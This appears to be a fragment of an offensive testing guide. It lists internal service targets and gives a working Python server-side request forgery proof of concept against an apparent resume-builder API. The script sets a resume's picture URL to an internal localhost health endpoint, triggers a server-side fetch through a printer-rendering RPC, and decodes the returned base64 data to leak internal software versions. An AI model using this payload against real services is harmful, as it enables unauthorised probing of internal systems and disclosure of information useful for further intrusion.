...
TARGETS = [
    ...
    ("swarm svc / common",      "http://browserless:3000"),
...
If the target accepts a URL whose response body gets returned (e.g. a `picture.url` that becomes a base64 data URL in the JSON response), point it at the server's own `/health` / `/status` / `/metrics`:

```python
# Set the attacker-controlled URL to an internal version-echo endpoint
patch_body = {"json": {"id": RESUME_ID, "operations": [
    {"op": "replace", "path": "/picture/url", "value": "http://localhost:3000/api/health"}
]}}
s.post(BASE + "/api/rpc/resume/patch", json=patch_body,
       headers={"Content-Type": "application/json"}, timeout=10)

# Trigger fetch — unauth if the endpoint leaks to public callers
r = requests.post(BASE + "/api/rpc/resume/getByIdForPrinter",
                  json={"json": {"id": RESUME_ID}},
                  headers={"Content-Type": "application/json"}, timeout=20, verify=False)
url = r.json().get("json", {}).get("data", {}).get("picture", {}).get("url", "")
if url.startswith("data:"):
    import base64
    _, _, b64 = url.partition(",")
    print(base64.b64decode(b64[:6000]).decode("utf-8", "replace"))
# Look for Node/Chrome/V8/DB versions in the echoed JSON.
```
